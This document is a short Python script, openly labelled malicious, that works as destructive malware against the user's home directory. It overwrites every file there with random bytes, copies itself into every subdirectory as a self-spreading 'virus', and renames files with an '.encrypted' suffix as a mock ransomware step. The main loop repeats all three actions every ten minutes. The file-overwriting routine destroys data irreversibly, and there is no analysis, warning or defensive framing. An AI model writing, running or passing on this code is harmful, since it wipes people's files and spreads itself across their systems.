import os
import shutil
import time

# Path where malicious activity will take place
home_directory = os.path.expanduser("~")

# Malicious Action 1: Overwrite files with random data
def corrupt_files(path):
    try:
        for root, dirs, files in os.walk(path):
            for file in files:
                full_path = os.path.join(root, file)
                with open(full_path, 'wb') as f:
                    f.write(os.urandom(1024))  # Writing 1KB of random data
        print(f"Corrupted files in {path}")
    except Exception as e:
        print(f"Error corrupting files: {e}")

# Malicious Action 2: Replicate script across directories
def replicate_script(target_directory):
    try:
        script_name = os.path.basename(__file__)
        for root, dirs, files in os.walk(target_directory):
            for dir in dirs:
                target_path = os.path.join(root, dir, script_name)
                shutil.copyfile(__file__, target_path)
                print(f"Copied virus to {target_path}")
    except Exception as e:
        print(f"Error replicating script: {e}")

# Malicious Action 3: Simulate ransomware behavior
def ransomware_simulation(path):
    try:
        for root, dirs, files in os.walk(path):
            for file in files:
                full_path = os.path.join(root, file)
                new_name = full_path + ".encrypted"
                os.rename(full_path, new_name)
        print(f"Files in {path} have been encrypted.")
    except Exception as e:
        print(f"Error in encryption simulation: {e}")

if __name__ == "__main__":
    while True:
        # Trigger malicious actions at regular intervals
        corrupt_files(home_directory)
        replicate_script(home_directory)
        ransomware_simulation(home_directory)
        
        time.sleep(60 * 10)  # Run every 10 minutes
